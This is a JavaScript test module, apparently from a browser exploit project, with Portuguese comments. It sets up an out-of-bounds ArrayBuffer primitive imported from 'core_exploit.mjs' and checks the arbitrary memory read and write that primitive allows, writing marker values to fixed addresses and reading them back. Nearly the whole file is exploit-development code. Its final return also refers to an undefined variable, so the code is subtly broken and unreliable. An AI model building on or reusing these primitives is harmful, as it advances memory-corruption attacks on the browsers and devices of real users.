// js/script3/testArrayBufferVictimCrash.mjs (Abordagem v28: Teste de Bloco Final com Reset Explícito do DV)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    isOOBReady,
    arb_read,  // Do core_exploit.mjs (síncrona, reutiliza DV, salva/restaura metadados)
    arb_write, // Do core_exploit.mjs
    oob_read_absolute, 
    oob_write_absolute 
} from '../core_exploit.mjs'; // Certifique-se de usar a versão "v17_base" / "v23" / "v25_base"

export const FNAME_MODULE_V28 = "GetterArbitraryRead_v28_FinalBlockTest";

// === Constantes ===
const BLOCK_ADDR_BASE_V28 = new AdvancedInt64(0x00000E00, 0x00000000);
const BLOCK_VAL_1_V28 = new AdvancedInt64(0xAAAAAAA1, 0x1111111A);
const BLOCK_VAL_2_V28 = new AdvancedInt64(0xBBBBBBB2, 0x2222222B);
const BLOCK_VAL_3_V28 = new AdvancedInt64(0xCCCCCCC3, 0x3333333C);
const BLOCK_ADDRS_V28 = [BLOCK_ADDR_BASE_V28, BLOCK_ADDR_BASE_V28.add(8), BLOCK_ADDR_BASE_V28.add(16)];
const BLOCK_VALS_V28 = [BLOCK_VAL_1_V28, BLOCK_VAL_2_V28, BLOCK_VAL_3_V28];

const PAUSE_OP_V28 = 100; // Pausa entre operações individuais R/W no bloco
const PAUSE_PHASE_V28 = 300; // Pausa entre a fase de escrita e a fase de leitura do bloco

let testLog_v28 = [];

function recordResult_v28(step, address, operation, valueWritten, valueExpected, valueReadObj) {
    let actualSuccess = false;
    const valueReadStr = isAdvancedInt64Object(valueReadObj) 
        ? valueReadObj.toString(true) 
        : (typeof valueReadObj === 'number' ? toHex(valueReadObj) : String(valueReadObj));
    const valueExpectedStr = (valueExpected === null || typeof valueExpected === 'undefined') 
        ? "N/A" 
        : (isAdvancedInt64Object(valueExpected) ? valueExpected.toString(true) : toHex(valueExpected));
    const valueWrittenStr = valueWritten 
        ? (isAdvancedInt64Object(valueWritten) ? valueWritten.toString(true) : toHex(valueWritten)) 
        : "N/A";
    const addressStr = address ? address.toString(true) : "N/A";

    if (valueExpected === null || operation.toLowerCase().includes("write only") || operation.toLowerCase().includes("reset dv")) {
        actualSuccess = true; 
    } else if (isAdvancedInt64Object(valueExpected)) {
        actualSuccess = isAdvancedInt64Object(valueReadObj) && valueExpected.equals(valueReadObj);
    } else if (typeof valueExpected === 'number' && typeof valueReadObj === 'number') {
        actualSuccess = (valueExpected === valueReadObj);
    } else { actualSuccess = false; }
    
    const entry = { step, address: addressStr, operation, valueWritten: valueWrittenStr, 
                    valueExpected: valueExpectedStr, valueRead: valueReadStr, success: actualSuccess };
    testLog_v28.push(entry);
    const logType = actualSuccess ? "good" : "error";
    const statusMsg = actualSuccess ? "CORRETO" : "INCORRETO";
    logS3(`  [${step}] ${operation}: Addr=${entry.address}, Escrito=${entry.valueWritten}, Lido=${entry.valueRead}, Esperado=${entry.valueExpected} - ${statusMsg}`, logType, FNAME_MODULE_V28);
    return actualSuccess;
}

async function explicit_dv_reset_v28(tag) {
    const FNAME_RESET = `${FNAME_MODULE_V28}.explicit_dv_reset`;
    // logS3(`    ResetDV-${tag}: Forçando operação no oob_array_buffer[0]...`, 'debug', FNAME_RESET);
    try {
      if (isOOBReady()){
        const temp_val = oob_read_absolute(0,1); 
        oob_write_absolute(0, temp_val, 1);      
        // logS3(`        ResetDV-${tag}: Operação em oob_array_buffer[0] concluída.`, 'debug', FNAME_RESET);
      }
    } catch (e) {
        logS3(`        ResetDV-${tag}: ERRO durante o reset explícito: ${e.message}`, 'error', FNAME_RESET);
    }
    await PAUSE_S3(PAUSE_OP_V28); // Pausa após cada reset
}

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.testFinalBlockRW`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste Final de Bloco com Reset Explícito do DV (v28) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;
    testLog_v28 = [];

    let errorCapturedMain = null;
    let overall_test_success = true;
    let final_message = "Teste de Bloco (v28) em execução...";

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) throw new Error("Ambiente OOB inicial principal não pôde ser configurado.");
        logS3("PASSO GLOBAL: Ambiente OOB inicial principal configurado.", "info", FNAME_CURRENT_TEST);

        // --- Teste de Bloco com Reset Explícito do DV ---
        logS3("--- CENÁRIO ÚNICO: R/W em Bloco com Reset Explícito do DV ---", "subtest", FNAME_CURRENT_TEST);
        
        // Fase de Escrita do Bloco
        logS3("  FASE DE ESCRITA DO BLOCO:", "info", FNAME_CURRENT_TEST);
        for (let i = 0; i < BLOCK_ADDRS_V28.length; i++) {
            const current_address = BLOCK_ADDRS_V28[i];
            const value_to_write = BLOCK_VALS_V28[i];
            logS3(`    Escrevendo ${value_to_write.toString(true)} em ${current_address.toString(true)} (Item ${i})`, 'info', FNAME_CURRENT_TEST);
            
            await explicit_dv_reset_v28(`PreWrite-${i}`); // Reset ANTES de configurar para o endereço do bloco
            arb_write(current_address, value_to_write, 8);
            
            // Leitura imediata para verificar
            const read_after_write = arb_read(current_address, 8);
            if(!recordResult_v28(`WriteRead.${i}`, current_address, `Write/Read Imediato Bloco Val ${i}`, value_to_write, value_to_write, read_after_write)) {
                overall_test_success = false;
                logS3(`      FALHA na leitura imediata após escrita em ${current_address.toString(true)}!`, "critical", FNAME_CURRENT_TEST);
            }
            await explicit_dv_reset_v28(`PostWriteRead-${i}`); // Reset APÓS operar no endereço do bloco
        }
        
        logS3("  FASE DE ESCRITA DO BLOCO CONCLUÍDA.", "info", FNAME_CURRENT_TEST);
        logS3("  Pausa MUITO Longa (" + PAUSE_PHASE_V28 + "ms) antes da leitura final do bloco...", "warn", FNAME_CURRENT_TEST);
        await PAUSE_S3(PAUSE_PHASE_V28);

        // Fase de Leitura do Bloco (Verificação Final)
        logS3("  FASE DE LEITURA FINAL DO BLOCO:", "info", FNAME_CURRENT_TEST);
        for (let i = 0; i < BLOCK_ADDRS_V28.length; i++) {
            const current_address = BLOCK_ADDRS_V28[i];
            const expected_value = BLOCK_VALS_V28[i];
            
            await explicit_dv_reset_v28(`PreFinalRead-${i}`); // Reset ANTES de ler o endereço do bloco
            const final_read_value = arb_read(current_address, 8);
            if(!recordResult_v28(`FinalRead.${i}`, current_address, `Read Final Bloco Val ${i}`, null, expected_value, final_read_value)) {
                overall_test_success = false;
                 logS3(`      FALHA na leitura final de ${current_address.toString(true)}!`, "critical", FNAME_CURRENT_TEST);
            }
            // Não é necessário reset após a última leitura de cada item se o próximo passo é outro reset ou o fim.
        }

        if (overall_test_success && testLog_v28.every(r => r.success)) {
            final_message = `SUCESSO! Bloco de dados escrito e lido corretamente com reset explícito do DV (v28).`;
        } else {
            final_message = `FALHA PARCIAL: Um ou mais passos no teste de bloco (v28) falharam.`;
            overall_test_success = false; // Garante que é falso se algum teste falhou
        }
        logS3(`MSG FINAL DO CENÁRIO: ${final_message}`, overall_test_success ? "vuln" : "error", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28}: ${overall_test_success ? "BLOCK RESET OK" : "BLOCK RESET FAIL"}`;

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        final_message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
        document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
        overall_test_success = false;
    } finally {
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Final Teste de Bloco com Reset Explícito DV (v28): Success=${overall_test_success}, Msg='${final_message}'`, overall_test_success ? "good" : "warn", FNAME_CURRENT_TEST);
        testLog_v28.forEach(res => {
            const successString = res.success ? "OK" : `FALHA (Erro: ${res.error || 'Valor Incorreto'})`;
            logS3(`  [${res.step}] Addr=${res.address}, Op=${res.operation}, W=${res.valueWritten}, R=${res.valueRead}, E=${res.valueExpected} => ${successString}`, 
                  res.success ? "info" : "error", FNAME_MODULE_V28 + ".Details");
        });
    }
    return { errorCapturedMain, overall_success, final_message, test_log_details: testLog_v28 };
}
